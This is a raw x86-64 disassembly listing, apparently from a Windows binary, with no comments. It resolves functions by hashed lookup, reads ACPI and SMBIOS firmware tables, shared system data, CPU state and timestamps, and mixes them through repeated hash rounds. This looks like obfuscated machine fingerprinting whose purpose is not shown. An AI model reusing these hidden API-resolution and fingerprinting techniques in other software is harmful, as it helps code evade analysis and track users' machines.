   140046bc2:	inc    cl
   140046bc4:	mov    BYTE PTR [rip+0x51fee],cl        # 0x140098bb8
   140046bca:	test   rax,rax
   140046bcd:	je     0x140046c0f
   140046bcf:	call   0x140064227
   140046bd4:	mov    eax,0x7193e62b
   140046bd9:	xchg   DWORD PTR [rip+0x51f01],eax        # 0x140098ae0
   140046bdf:	xor    ecx,ecx
   140046be1:	push   0xffffffffffffffff
   140046be3:	pop    rax
   140046be4:	mov    edx,eax
   140046be6:	lea    rsi,[rip+0x7]        # 0x140046bf4
   140046bed:	lea    rdi,[rip+0x3]        # 0x140046bf7
   140046bf4:	xgetbv
   140046bf7:	xor    ecx,ecx
   140046bf9:	xchg   DWORD PTR [rip+0x51ee1],ecx        # 0x140098ae0
   140046bff:	shl    rdx,0x20
   140046c03:	mov    esi,eax
   140046c05:	or     rsi,rdx
   140046c08:	mov    BYTE PTR [rip+0x51e7f],0x0        # 0x140098a8e
   140046c0f:	lea    rcx,[rip+0x51f4a]        # 0x140098b60
   140046c16:	mov    edx,0xba7c2f
   140046c1b:	mov    r8d,0xa7faf918
   140046c21:	call   0x140064358
   140046c26:	test   rax,rax
   140046c29:	je     0x140046c36
   140046c2b:	call   rax
   140046c2d:	and    rax,QWORD PTR [rbp+0x1170]
   140046c34:	jmp    0x140046c38
   140046c36:	xor    eax,eax
   140046c38:	mov    ecx,DWORD PTR [rbp+0x1180]
   140046c3e:	and    ecx,0x1
   140046c41:	mov    rdx,QWORD PTR [rbp+0x1178]
   140046c48:	shr    edx,0x13
   140046c4b:	and    edx,0x2
   140046c4e:	or     edx,ecx
   140046c50:	lea    ecx,[rdx+r15*4]
   140046c54:	mov    QWORD PTR [rbp+0x7d0],rcx
   140046c5b:	mov    QWORD PTR [rbp+0x7d8],r14
   140046c62:	mov    QWORD PTR [rbp+0x7e0],r14
   140046c69:	mov    QWORD PTR [rbp+0x7e8],rbx
   140046c70:	mov    QWORD PTR [rbp+0x7f0],rsi
   140046c77:	mov    rcx,QWORD PTR [rbp+0x1170]
   140046c7e:	mov    QWORD PTR [rbp+0x7f8],rcx
   140046c85:	mov    QWORD PTR [rbp+0x800],rax
   140046c8c:	mov    QWORD PTR [rbp+0x808],rcx
   140046c93:	xor    eax,eax
   140046c95:	movabs rcx,0x5263b97ebb8ecbab
   140046c9f:	movabs rdi,0x406aa9c82dbf9701
   140046ca9:	cmp    rax,0x40
   140046cad:	je     0x140046d97
   140046cb3:	mov    rdx,r13
   140046cb6:	xor    rdx,rcx
   140046cb9:	imul   rdx,rdi
   140046cbd:	mov    r8,rdx
   140046cc0:	shr    r8,0x1d
   140046cc4:	xor    r8,rdx
   140046cc7:	movabs rbx,0xeb591050d1f713a9
   140046cd1:	imul   r8,rbx
   140046cd5:	mov    rdx,r8
   140046cd8:	shr    rdx,0x20
   140046cdc:	xor    rdx,r8
   140046cdf:	mov    r8,rcx
   140046ce2:	movabs r9,0x629eef0eeda7e1b9
   140046cec:	xor    r8,r9
   140046cef:	imul   r8,rdi
   140046cf3:	mov    r10,r8
   140046cf6:	shr    r10,0x1d
   140046cfa:	xor    r10,r8
   140046cfd:	imul   r10,rbx
   140046d01:	mov    r9,r10
   140046d04:	shr    r9,0x20
   140046d08:	xor    r9,r10
   140046d0b:	mov    r10,rdx
   140046d0e:	rol    r10,0x7
   140046d12:	or     r9,0x1
   140046d16:	mov    r11,rdx
   140046d19:	rol    r11,0x29
   140046d1d:	add    r10,rcx
   140046d20:	mov    r8,QWORD PTR [rbp+rax*1+0x7d0]
   140046d28:	add    r8,r10
   140046d2b:	imul   r8,r9
   140046d2f:	add    r8,r13
   140046d32:	add    r8,r12
   140046d35:	mov    r12,rcx
   140046d38:	rol    r12,0x20
   140046d3c:	movabs r14,0x6161c4ba7c2419b8
   140046d46:	xor    r12,r14
   140046d49:	lea    rsi,[r11+r12*1]
   140046d4d:	sub    r12,r10
   140046d50:	add    rsi,QWORD PTR [rbp+rax*1+0x7d8]
   140046d58:	add    r12,r11
   140046d5b:	imul   rsi,r9
   140046d5f:	imul   r12,r9
   140046d63:	sub    r12,rdx
   140046d66:	sub    r12,rsi
   140046d69:	add    r12,r8
   140046d6c:	xor    rcx,r14
   140046d6f:	imul   rcx,rdi
   140046d73:	mov    r8,rcx
   140046d76:	shr    r8,0x1d
   140046d7a:	xor    r8,rcx
   140046d7d:	imul   r8,rbx
   140046d81:	mov    rcx,r8
   140046d84:	shr    rcx,0x20
   140046d88:	xor    rcx,r8
   140046d8b:	add    rax,0x10
   140046d8f:	mov    r13,rdx
   140046d92:	jmp    0x140046ca9
   140046d97:	xor    eax,eax
   140046d99:	cmp    rax,0x20
   140046d9d:	je     0x140046db7
   140046d9f:	or     QWORD PTR [rbp+rax*1+0xd10],0xffffffffffffffff
   140046da8:	and    QWORD PTR [rbp+rax*1+0xd18],0x0
   140046db1:	add    rax,0x10
   140046db5:	jmp    0x140046d99
   140046db7:	mov    rax,QWORD PTR [rbp+0x6b0]
   140046dbe:	mov    rax,QWORD PTR [rax+0x30]
   140046dc2:	mov    QWORD PTR [rbp+0x1180],rax
   140046dc9:	xor    ebx,ebx
   140046dcb:	mov    QWORD PTR [rbp+0x1170],0x0
   140046dd6:	push   0xffffffffffffffff
   140046dd8:	pop    rax
   140046dd9:	mov    QWORD PTR [rbp+0x1178],rax
   140046de0:	mov    r15,rbx
   140046de3:	shl    r15,0x4
   140046de7:	lea    rax,[rbp+0xd00]
   140046dee:	add    r15,rax
   140046df1:	cmp    rbx,0x1
   140046df5:	ja     0x140046f98
   140046dfb:	mov    rsi,rbx
   140046dfe:	jne    0x140046e2a
   140046e00:	lea    rcx,[rip+0x51d41]        # 0x140098b48
   140046e07:	mov    edx,0xba7c2f
   140046e0c:	mov    r8d,0xc6724b05
   140046e12:	call   0x140064358
   140046e17:	test   rax,rax
   140046e1a:	je     0x140046e59
   140046e1c:	mov    ecx,0x41435049
   140046e21:	xor    edx,edx
   140046e23:	xor    r8d,r8d
   140046e26:	call   rax
   140046e28:	jmp    0x140046e55
   140046e2a:	lea    rcx,[rip+0x51d47]        # 0x140098b78
   140046e31:	mov    edx,0xba7c2f
   140046e36:	mov    r8d,0x7ec418d7
   140046e3c:	call   0x140064358
   140046e41:	test   rax,rax
   140046e44:	je     0x140046e59
   140046e46:	mov    ecx,0x52534d42
   140046e4b:	xor    edx,edx
   140046e4d:	xor    r8d,r8d
   140046e50:	xor    r9d,r9d
   140046e53:	call   rax
   140046e55:	mov    edi,eax
   140046e57:	jmp    0x140046e5b
   140046e59:	xor    edi,edi
   140046e5b:	cmp    QWORD PTR [rbp+0x1180],0x0
   140046e63:	sete   al
   140046e66:	mov    ebx,edi
   140046e68:	mov    QWORD PTR [r15+0x18],rbx
   140046e6c:	cmp    edi,0x8
   140046e6f:	setb   cl
   140046e72:	or     cl,al
   140046e74:	jne    0x140046ea5
   140046e76:	lea    rcx,[rip+0x51c33]        # 0x140098ab0
   140046e7d:	mov    edx,0xba7c2f
   140046e82:	mov    r8d,0xa86f2af6
   140046e88:	call   0x140064358
   140046e8d:	test   rax,rax
   140046e90:	je     0x140046ea5
   140046e92:	mov    rcx,QWORD PTR [rbp+0x1180]
   140046e99:	xor    edx,edx
   140046e9b:	mov    r8,rbx
   140046e9e:	call   rax
   140046ea0:	mov    r14,rax
   140046ea3:	jmp    0x140046ea8
   140046ea5:	xor    r14d,r14d
   140046ea8:	add    r15,0x10
   140046eac:	lea    rbx,[rsi+0x1]
   140046eb0:	test   r14,r14
   140046eb3:	je     0x140046df1
   140046eb9:	cmp    rsi,0x1
   140046ebd:	jne    0x140046eec
   140046ebf:	lea    rcx,[rip+0x51c82]        # 0x140098b48
   140046ec6:	mov    edx,0xba7c2f
   140046ecb:	mov    r8d,0xc6724b05
   140046ed1:	call   0x140064358
   140046ed6:	test   rax,rax
   140046ed9:	je     0x140046f1b
   140046edb:	mov    ecx,0x41435049
   140046ee0:	mov    rdx,r14
   140046ee3:	mov    r8d,edi
   140046ee6:	call   rax
   140046ee8:	mov    eax,eax
   140046eea:	jmp    0x140046f1d
   140046eec:	lea    rcx,[rip+0x51c85]        # 0x140098b78
   140046ef3:	mov    edx,0xba7c2f
   140046ef8:	mov    r8d,0x7ec418d7
   140046efe:	call   0x140064358
   140046f03:	test   rax,rax
   140046f06:	je     0x140046f51
   140046f08:	mov    ecx,0x52534d42
   140046f0d:	xor    edx,edx
   140046f0f:	mov    r8,r14
   140046f12:	mov    r9d,edi
   140046f15:	call   rax
   140046f17:	mov    eax,eax
   140046f19:	jmp    0x140046f53
   140046f1b:	xor    eax,eax
   140046f1d:	mov    QWORD PTR [r15],rax
   140046f20:	shr    edi,0x2
   140046f23:	xor    eax,eax
   140046f25:	mov    ecx,0x50434146
   140046f2a:	mov    rdx,QWORD PTR [rbp+0x1170]
   140046f31:	cmp    rdi,rax
   140046f34:	je     0x140046f48
   140046f36:	cmp    DWORD PTR [r14+rax*4],0x50434146
   140046f3e:	lea    rax,[rax+0x1]
   140046f42:	cmove  rdx,rcx
   140046f46:	jmp    0x140046f31
   140046f48:	mov    QWORD PTR [rbp+0x1170],rdx
   140046f4f:	jmp    0x140046f65
   140046f51:	xor    eax,eax
   140046f53:	mov    QWORD PTR [r15],rax
   140046f56:	mov    eax,DWORD PTR [r14+0x4]
   140046f5a:	add    rax,0x8
   140046f5e:	mov    QWORD PTR [rbp+0x1178],rax
   140046f65:	lea    rcx,[rip+0x51b4c]        # 0x140098ab8
   140046f6c:	mov    edx,0xba7c2f
   140046f71:	mov    r8d,0xb05949f4
   140046f77:	call   0x140064358
   140046f7c:	test   rax,rax
   140046f7f:	je     0x140046de0
   140046f85:	mov    rcx,QWORD PTR [rbp+0x1180]
   140046f8c:	xor    edx,edx
   140046f8e:	mov    r8,r14
   140046f91:	call   rax
   140046f93:	jmp    0x140046de0
   140046f98:	mov    rax,QWORD PTR [rbp+0xd10]
   140046f9f:	mov    rcx,QWORD PTR [rbp+0xd18]
   140046fa6:	push   0x40
   140046fa8:	pop    r8
   140046faa:	cmp    rcx,r8
   140046fad:	mov    rdx,r8
   140046fb0:	cmovb  rdx,rcx
   140046fb4:	movups xmm0,XMMWORD PTR [rbp+0xd20]
   140046fbb:	mov    QWORD PTR [rbp+0x7d0],rax
   140046fc2:	mov    QWORD PTR [rbp+0x7d8],rcx
   140046fc9:	mov    rax,QWORD PTR [rbp+0x1178]
   140046fd0:	mov    QWORD PTR [rbp+0x7e0],rax
   140046fd7:	mov    QWORD PTR [rbp+0x7e8],rcx
   140046fde:	mov    QWORD PTR [rbp+0x7f0],rdx
   140046fe5:	mov    QWORD PTR [rbp+0x7f8],r8
   140046fec:	movups XMMWORD PTR [rbp+0x800],xmm0
   140046ff3:	mov    rax,QWORD PTR [rbp+0x1170]
   140046ffa:	mov    QWORD PTR [rbp+0x810],rax
   140047001:	mov    QWORD PTR [rbp+0x818],0x50434146
   14004700c:	push   0x8
   14004700e:	pop    rax
   14004700f:	movabs rcx,0x1fc8fd373340ab2a
   140047019:	movabs rdi,0x406aa9c82dbf9701
   140047023:	cmp    rax,0x58
   140047027:	je     0x140047111
   14004702d:	mov    rdx,r13
   140047030:	xor    rdx,rcx
   140047033:	imul   rdx,rdi
   140047037:	mov    r8,rdx
   14004703a:	shr    r8,0x1d
   14004703e:	xor    r8,rdx
   140047041:	movabs rbx,0xeb591050d1f713a9
   14004704b:	imul   r8,rbx
   14004704f:	mov    rdx,r8
   140047052:	shr    rdx,0x20
   140047056:	xor    rdx,r8
   140047059:	mov    r8,rcx
   14004705c:	movabs r9,0x629eef0eeda7e1b9
   140047066:	xor    r8,r9
   140047069:	imul   r8,rdi
   14004706d:	mov    r10,r8
   140047070:	shr    r10,0x1d
   140047074:	xor    r10,r8
   140047077:	imul   r10,rbx
   14004707b:	mov    r9,r10
   14004707e:	shr    r9,0x20
   140047082:	xor    r9,r10
   140047085:	mov    r10,rdx
   140047088:	rol    r10,0x7
   14004708c:	or     r9,0x1
   140047090:	mov    r11,rdx
   140047093:	rol    r11,0x29
   140047097:	add    r10,rcx
   14004709a:	mov    r8,QWORD PTR [rbp+rax*1+0x7c8]
   1400470a2:	add    r8,r10
   1400470a5:	imul   r8,r9
   1400470a9:	add    r8,r13
   1400470ac:	add    r8,r12
   1400470af:	mov    r12,rcx
   1400470b2:	rol    r12,0x20
   1400470b6:	movabs r14,0x6161c4ba7c2419b8
   1400470c0:	xor    r12,r14
   1400470c3:	lea    rsi,[r11+r12*1]
   1400470c7:	sub    r12,r10
   1400470ca:	add    rsi,QWORD PTR [rbp+rax*1+0x7d0]
   1400470d2:	add    r12,r11
   1400470d5:	imul   rsi,r9
   1400470d9:	imul   r12,r9
   1400470dd:	sub    r12,rdx
   1400470e0:	sub    r12,rsi
   1400470e3:	add    r12,r8
   1400470e6:	xor    rcx,r14
   1400470e9:	imul   rcx,rdi
   1400470ed:	mov    r8,rcx
   1400470f0:	shr    r8,0x1d
   1400470f4:	xor    r8,rcx
   1400470f7:	imul   r8,rbx
   1400470fb:	mov    rcx,r8
   1400470fe:	shr    rcx,0x20
   140047102:	xor    rcx,r8
   140047105:	add    rax,0x10
   140047109:	mov    r13,rdx
   14004710c:	jmp    0x140047023
   140047111:	mov    ebx,DWORD PTR ds:0x7ffe026c
   140047118:	mov    r14d,DWORD PTR ds:0x7ffe0270
   140047120:	mov    eax,DWORD PTR ds:0x7ffe0260
   140047127:	mov    QWORD PTR [rbp+0x1158],rax
   14004712e:	mov    ecx,0x110
   140047133:	xor    eax,eax
   140047135:	lea    rdi,[rbp+0x7d4]
   14004713c:	rep stos BYTE PTR [rdi],al
   14004713e:	mov    DWORD PTR [rbp+0x7d0],0x114
   140047148:	lea    rcx,[rip+0x519d9]        # 0x140098b28
   14004714f:	mov    edx,0x9394fb88
   140047154:	mov    r8d,0xb7cb6cdb
   14004715a:	call   0x140064358
   14004715f:	test   rax,rax
   140047162:	je     0x14004716d
   140047164:	lea    rcx,[rbp+0x7d0]
   14004716b:	call   rax
   14004716d:	movzx  eax,WORD PTR [rbp+0x7dc]
   140047174:	mov    QWORD PTR [rbp+0xf78],rax
   14004717b:	mov    r15d,DWORD PTR [rbp+0x7d4]
   140047182:	mov    esi,DWORD PTR [rbp+0x7d8]
   140047188:	mov    rax,QWORD PTR [rbp+0x6b0]
   14004718f:	movzx  ecx,WORD PTR [rax+0x120]
   140047196:	mov    QWORD PTR [rbp+0x1140],rcx
   14004719d:	mov    ecx,DWORD PTR [rax+0x118]
   1400471a3:	mov    QWORD PTR [rbp+0x1058],rcx
   1400471aa:	mov    edi,DWORD PTR [rax+0x11c]
   1400471b0:	movaps XMMWORD PTR [rbp+0x420],xmm6
   1400471b7:	movaps XMMWORD PTR [rbp+0x410],xmm6
   1400471be:	movaps XMMWORD PTR [rbp+0x400],xmm6
   1400471c5:	lea    rcx,[rbp+0x400]
   1400471cc:	call   0x14006487c
   1400471d1:	mov    ecx,DWORD PTR [rbp+0x420]
   1400471d7:	mov    al,BYTE PTR ds:0x7ffe03c4
   1400471de:	mov    QWORD PTR [rbp+0x1180],rcx
   1400471e5:	mov    QWORD PTR [rbp+0x1178],rcx
   1400471ec:	mov    QWORD PTR [rbp+0x1170],rcx
   1400471f3:	cmp    al,0x1
   1400471f5:	jne    0x140047219
   1400471f7:	mov    eax,DWORD PTR ds:0x7ffe03c0
   1400471fe:	mov    QWORD PTR [rbp+0x1170],rax
   140047205:	mov    rax,QWORD PTR [rbp+0x6b0]
   14004720c:	mov    eax,DWORD PTR [rax+0xb8]
   140047212:	mov    QWORD PTR [rbp+0x1180],rax
   140047219:	shl    rbx,0x28
   14004721d:	shl    r14,0x20
   140047221:	or     r14,rbx
   140047224:	movzx  ebx,WORD PTR [rbp+0x1158]
   14004722b:	or     rbx,r14
   14004722e:	shl    r15,0x28
   140047232:	shl    rsi,0x20
   140047236:	or     rsi,r15
   140047239:	add    rsi,QWORD PTR [rbp+0xf78]
   140047240:	mov    rax,QWORD PTR [rbp+0x1058]
   140047247:	shl    rax,0x28
   14004724b:	shl    rdi,0x20
   14004724f:	or     rdi,rax
   140047252:	add    rdi,QWORD PTR [rbp+0x1140]
   140047259:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   140047260:	movaps XMMWORD PTR [rbp+0xfb0],xmm6
   140047267:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   14004726e:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   140047275:	mov    DWORD PTR [rbp+0xf80],0x40
   14004727f:	lea    rcx,[rbp+0xf80]
   140047286:	call   0x140065f57
   14004728b:	mov    eax,DWORD PTR ds:0x7ffe02e8
   140047292:	mov    rcx,QWORD PTR [rbp+0xf88]
   140047299:	shr    rcx,0xc
   14004729d:	mov    QWORD PTR [rbp+0xd10],rbx
   1400472a4:	mov    QWORD PTR [rbp+0xd18],rsi
   1400472ab:	mov    QWORD PTR [rbp+0xd20],rbx
   1400472b2:	mov    QWORD PTR [rbp+0xd28],rdi
   1400472b9:	mov    rdx,QWORD PTR [rbp+0x1170]
   1400472c0:	mov    QWORD PTR [rbp+0xd30],rdx
   1400472c7:	mov    rdx,QWORD PTR [rbp+0x1178]
   1400472ce:	mov    QWORD PTR [rbp+0xd38],rdx
   1400472d5:	mov    r8,QWORD PTR [rbp+0x1180]
   1400472dc:	mov    QWORD PTR [rbp+0xd40],r8
   1400472e3:	mov    QWORD PTR [rbp+0xd48],rdx
   1400472ea:	mov    QWORD PTR [rbp+0xd50],rax
   1400472f1:	mov    QWORD PTR [rbp+0xd58],rcx
   1400472f8:	push   0x8
   1400472fa:	pop    rax
   1400472fb:	movabs rcx,0x11f98e4f2a9e6527
   140047305:	movabs rdi,0x406aa9c82dbf9701
   14004730f:	cmp    rax,0x58
   140047313:	je     0x1400473fd
   140047319:	mov    rdx,r13
   14004731c:	xor    rdx,rcx
   14004731f:	imul   rdx,rdi
   140047323:	mov    r8,rdx
   140047326:	shr    r8,0x1d
   14004732a:	xor    r8,rdx
   14004732d:	movabs rbx,0xeb591050d1f713a9
   140047337:	imul   r8,rbx
   14004733b:	mov    rdx,r8
   14004733e:	shr    rdx,0x20
   140047342:	xor    rdx,r8
   140047345:	mov    r8,rcx
   140047348:	movabs r9,0x629eef0eeda7e1b9
   140047352:	xor    r8,r9
   140047355:	imul   r8,rdi
   140047359:	mov    r10,r8
   14004735c:	shr    r10,0x1d
   140047360:	xor    r10,r8
   140047363:	imul   r10,rbx
   140047367:	mov    r9,r10
   14004736a:	shr    r9,0x20
   14004736e:	xor    r9,r10
   140047371:	mov    r10,rdx
   140047374:	rol    r10,0x7
   140047378:	or     r9,0x1
   14004737c:	mov    r11,rdx
   14004737f:	rol    r11,0x29
   140047383:	add    r10,rcx
   140047386:	mov    r8,QWORD PTR [rbp+rax*1+0xd08]
   14004738e:	add    r8,r10
   140047391:	imul   r8,r9
   140047395:	add    r8,r13
   140047398:	add    r8,r12
   14004739b:	mov    r12,rcx
   14004739e:	rol    r12,0x20
   1400473a2:	movabs r14,0x6161c4ba7c2419b8
   1400473ac:	xor    r12,r14
   1400473af:	lea    rsi,[r11+r12*1]
   1400473b3:	sub    r12,r10
   1400473b6:	add    rsi,QWORD PTR [rbp+rax*1+0xd10]
   1400473be:	add    r12,r11
   1400473c1:	imul   rsi,r9
   1400473c5:	imul   r12,r9
   1400473c9:	sub    r12,rdx
   1400473cc:	sub    r12,rsi
   1400473cf:	add    r12,r8
   1400473d2:	xor    rcx,r14
   1400473d5:	imul   rcx,rdi
   1400473d9:	mov    r8,rcx
   1400473dc:	shr    r8,0x1d
   1400473e0:	xor    r8,rcx
   1400473e3:	imul   r8,rbx
   1400473e7:	mov    rcx,r8
   1400473ea:	shr    rcx,0x20
   1400473ee:	xor    rcx,r8
   1400473f1:	add    rax,0x10
   1400473f5:	mov    r13,rdx
   1400473f8:	jmp    0x14004730f
   1400473fd:	add    r13,r12
   140047400:	mov    rcx,r13
   140047403:	call   0x140063d89
   140047408:	mov    QWORD PTR [rbp+0x1180],rax
   14004740f:	mov    rbx,QWORD PTR [rbp+0x390]
   140047416:	mov    r14,QWORD PTR [rbp+0x398]
   14004741d:	mov    rax,QWORD PTR [rbp+0x1160]
   140047424:	mov    rdi,QWORD PTR [rax+0x28]
   140047428:	call   0x140064168
   14004742d:	cmp    rax,0x1
   140047431:	jne    0x140047447
   140047433:	lea    rax,[rip+0x1cd79]        # 0x1400641b3
   14004743a:	mov    ecx,eax
   14004743c:	sub    ecx,edx
   14004743e:	sub    ebx,edx
   140047440:	mov    edx,ebx
   140047442:	mov    r8d,r14d
   140047445:	jmp    0x14004744f
   140047447:	xor    ecx,ecx
   140047449:	xor    edx,edx
   14004744b:	push   0x1
   14004744d:	pop    r8
   14004744f:	mov    r9,rdi
   140047452:	call   0x140063e53
   140047457:	mov    QWORD PTR [rbp+0x1170],rax
   14004745e:	mov    rax,QWORD PTR [rbp+0x1160]
   140047465:	mov    rcx,QWORD PTR [rax+0x10]
   140047469:	rdtsc
   14004746b:	shl    rdx,0x20
   14004746f:	or     rdx,rax
   140047472:	movabs rax,0xa35e6f073808b85a
   14004747c:	xor    rdx,rax
   14004747f:	movabs rax,0x406aa9c82dbf9701
   140047489:	imul   rdx,rax
   14004748d:	mov    rax,rdx
   140047490:	shr    rax,0x1d
   140047494:	xor    rax,rdx
   140047497:	movabs rdx,0xeb591050d1f713a9
   1400474a1:	imul   rax,rdx
   1400474a5:	mov    r14,rax
   1400474a8:	shr    r14,0x20
   1400474ac:	xor    r14,rax
   1400474af:	mov    rbx,r14
   1400474b2:	neg    rbx
   1400474b5:	add    rbx,rcx
   1400474b8:	mov    ecx,0x9394fb88
   1400474bd:	mov    edx,0x76fcc57c
   1400474c2:	call   0x140064480
   1400474c7:	test   rax,rax
   1400474ca:	je     0x1400474e1
   1400474cc:	mov    r15d,DWORD PTR [rax]
   1400474cf:	mov    r12d,DWORD PTR [rax+0x4]
   1400474d3:	call   0x14006495d
   1400474d8:	cmp    eax,0x1
   1400474db:	jne    0x1400474ec
   1400474dd:	mov    eax,edx
   1400474df:	jmp    0x14004750a
   1400474e1:	xor    r12d,r12d
   1400474e4:	push   0xffffffffffffffff
   1400474e6:	pop    r15
   1400474e8:	xor    eax,eax
   1400474ea:	jmp    0x14004750a
   1400474ec:	call   0x14006613c
   1400474f1:	call   0x14006495d
   1400474f6:	and    al,0x1
   1400474f8:	mov    r15d,r15d
   1400474fb:	mov    ecx,edx
   1400474fd:	cmp    al,0x1
   1400474ff:	mov    eax,0x0
   140047504:	sbb    rax,rax
   140047507:	or     rax,rcx
   14004750a:	mov    ecx,r12d
   14004750d:	mov    QWORD PTR [rbp+0x7d0],r15
   140047514:	mov    edx,0xb8d18b4c
   140047519:	mov    QWORD PTR [rbp+0x7d8],rdx
   140047520:	mov    QWORD PTR [rbp+0x7e0],rcx
   140047527:	mov    QWORD PTR [rbp+0x7e8],rax
   14004752e:	xor    eax,eax
   140047530:	movabs rcx,0xa35e6f073808b85a
   14004753a:	movabs rdi,0xeb591050d1f713a9
   140047544:	cmp    rax,0x20
   140047548:	je     0x140047641
   14004754e:	mov    rdx,rcx
   140047551:	xor    rdx,r14
   140047554:	movabs rsi,0x406aa9c82dbf9701
   14004755e:	imul   rdx,rsi
   140047562:	mov    r8,rdx
   140047565:	shr    r8,0x1d
   140047569:	xor    r8,rdx
   14004756c:	imul   r8,rdi
   140047570:	mov    rdx,r8
   140047573:	shr    rdx,0x20
   140047577:	xor    rdx,r8
   14004757a:	mov    r8,rcx
   14004757d:	movabs r9,0x629eef0eeda7e1b9
   140047587:	xor    r8,r9
   14004758a:	imul   r8,rsi
   14004758e:	mov    r10,r8
   140047591:	shr    r10,0x1d
   140047595:	xor    r10,r8
   140047598:	imul   r10,rdi
   14004759c:	mov    r9,r10
   14004759f:	shr    r9,0x20
   1400475a3:	xor    r9,r10
   1400475a6:	mov    r12,rdx
   1400475a9:	rol    r12,0x7
   1400475ad:	mov    r15,rdx
   1400475b0:	rol    r15,0x29
   1400475b4:	mov    r8,rcx
   1400475b7:	rol    r8,0x20
   1400475bb:	movabs r13,0x6161c4ba7c2419b8
   1400475c5:	xor    r8,r13
   1400475c8:	add    r12,rcx
   1400475cb:	mov    r11,QWORD PTR [rbp+rax*1+0x7d0]
   1400475d3:	add    r11,r12
   1400475d6:	mov    r10,QWORD PTR [rbp+rax*1+0x7d8]
   1400475de:	add    r10,r8
   1400475e1:	sub    r8,r12
   1400475e4:	movabs rdi,0xeb591050d1f713a9
   1400475ee:	add    r10,r15
   1400475f1:	add    r8,r15
   1400475f4:	or     r9,0x1
   1400475f8:	imul   r11,r9
   1400475fc:	imul   r10,r9
   140047600:	imul   r8,r9
   140047604:	add    r11,r14
   140047607:	add    rbx,r11
   14004760a:	sub    r8,rdx
   14004760d:	sub    r8,r10
   140047610:	add    r8,rbx
   140047613:	xor    rcx,r13
   140047616:	imul   rcx,rsi
   14004761a:	mov    r9,rcx
   14004761d:	shr    r9,0x1d
   140047621:	xor    r9,rcx
   140047624:	imul   r9,rdi
   140047628:	mov    rcx,r9
   14004762b:	shr    rcx,0x20
   14004762f:	xor    rcx,r9
   140047632:	add    rax,0x10
   140047636:	mov    rbx,r8
   140047639:	mov    r14,rdx
   14004763c:	jmp    0x140047544
   140047641:	mov    QWORD PTR [rbp+0x408],r14
   140047648:	movabs rax,0x6b20b431daeb7a6f
   140047652:	mov    QWORD PTR [rbp+0x410],rax
   140047659:	mov    QWORD PTR [rbp+0x400],rbx
   140047660:	lea    rcx,[rbp+0x400]
   140047667:	call   0x14003aef8
   14004766c:	mov    r14,QWORD PTR gs:0x60
   140047675:	mov    rbx,QWORD PTR gs:0x40
   14004767e:	movaps XMMWORD PTR [rbp+0xfa0],xmm6
   140047685:	movaps XMMWORD PTR [rbp+0xf90],xmm6
   14004768c:	movaps XMMWORD PTR [rbp+0xf80],xmm6
   140047693:	and    DWORD PTR [rbp+0x640],0x0
   14004769a:	mov    ecx,0x43b0f7b9
   14004769f:	call   0x1400660f6
   1400476a4:	mov    r15d,0xc0000001
   1400476aa:	mov    r12d,0xc0000001
   1400476b0:	cmp    eax,0x1
   1400476b3:	jne    0x140047705
   1400476b5:	or     QWORD PTR [rbp+0x7d0],0xffffffffffffffff
   1400476bd:	and    QWORD PTR [rbp+0x7d8],0x0
   1400476c5:	lea    rax,[rbp+0xf80]
   1400476cc:	mov    QWORD PTR [rbp+0x7e0],rax
   1400476d3:	mov    QWORD PTR [rbp+0x7e8],0x30
   1400476de:	lea    rax,[rbp+0x640]
   1400476e5:	mov    QWORD PTR [rbp+0x7f0],rax
   1400476ec:	and    QWORD PTR [rbp+0x7f8],0x0
   1400476f4:	mov    ecx,edx
   1400476f6:	lea    rdx,[rbp+0x7d0]
   1400476fd:	call   0x14006616d
   140047702:	mov    r12d,eax
   140047705:	movaps XMMWORD PTR [rbp+0xd30],xmm6
   14004770c:	movaps XMMWORD PTR [rbp+0xd20],xmm6
   140047713:	movaps XMMWORD PTR [rbp+0xd10],xmm6
   14004771a:	and    QWORD PTR [rbp+0x290],0x0
   140047722:	mov    ecx,0xb17aae04
   140047727:	call   0x1400660f6
   14004772c:	cmp    eax,0x1
   14004772f:	jne    0x140047787
   140047731:	or     QWORD PTR [rbp+0x7d0],0xffffffffffffffff
   140047739:	lea    rax,[rip+0x1c09f]        # 0x1400637df
   140047740:	mov    QWORD PTR [rbp+0x7d8],rax
   140047747:	and    QWORD PTR [rbp+0x7e0],0x0
   14004774f:	lea    rax,[rbp+0xd10]
   140047756:	mov    QWORD PTR [rbp+0x7e8],rax
   14004775d:	mov    QWORD PTR [rbp+0x7f0],0x30
   140047768:	lea    rax,[rbp+0x290]
   14004776f:	mov    QWORD PTR [rbp+0x7f8],rax
   140047776:	mov    ecx,edx
   140047778:	lea    rdx,[rbp+0x7d0]
   14004777f:	call   0x14006616d
   140047784:	mov    r15d,eax
   140047787:	mov    r13,QWORD PTR [rbp+0xf88]
   14004778e:	mov    rsi,QWORD PTR [rbp+0xfa0]
   140047795:	mov    rdi,QWORD PTR [rbp+0xd18]
   14004779c:	call   0x1400641a4
   1400477a1:	test   al,0x1
   1400477a3:	mov    eax,0x0
   1400477a8:	cmove  rdx,rax
   1400477ac:	mov    eax,DWORD PTR [rbp+0xd38]
   1400477b2:	mov    QWORD PTR [rbp+0x7d0],r12
   1400477b9:	and    QWORD PTR [rbp+0x7d8],0x0
   1400477c1:	mov    QWORD PTR [rbp+0x7e0],r13
   1400477c8:	mov    QWORD PTR [rbp+0x7e8],r14
   1400477cf:	mov    QWORD PTR [rbp+0x7f0],rsi
   1400477d6:	mov    QWORD PTR [rbp+0x7f8],rbx
   1400477dd:	mov    QWORD PTR [rbp+0x800],r15
   1400477e4:	and    QWORD PTR [rbp+0x808],0x0
   1400477ec:	mov    QWORD PTR [rbp+0x810],rdi
   1400477f3:	mov    QWORD PTR [rbp+0x818],rdx
   1400477fa:	mov    QWORD PTR [rbp+0x820],rax
   140047801:	mov    QWORD PTR [rbp+0x828],0x1000000
   14004780c:	mov    rax,QWORD PTR [rbp+0x400]
   140047813:	mov    r8,QWORD PTR [rbp+0x408]
   14004781a:	mov    rdx,QWORD PTR [rbp+0x410]
   140047821:	push   0x8
   140047823:	pop    rcx
   140047824:	movabs r11,0x406aa9c82dbf9701
   14004782e:	movabs rdi,0xeb591050d1f713a9
   140047838:	cmp    rcx,0x68
   14004783c:	je     0x140047935
   140047842:	mov    r9,rdx
   140047845:	xor    r9,r8
   140047848:	imul   r9,r11
   14004784c:	mov    r10,r9
   14004784f:	shr    r10,0x1d
   140047853:	xor    r10,r9
   140047856:	imul   r10,rdi
   14004785a:	mov    r9,r10
   14004785d:	shr    r9,0x20
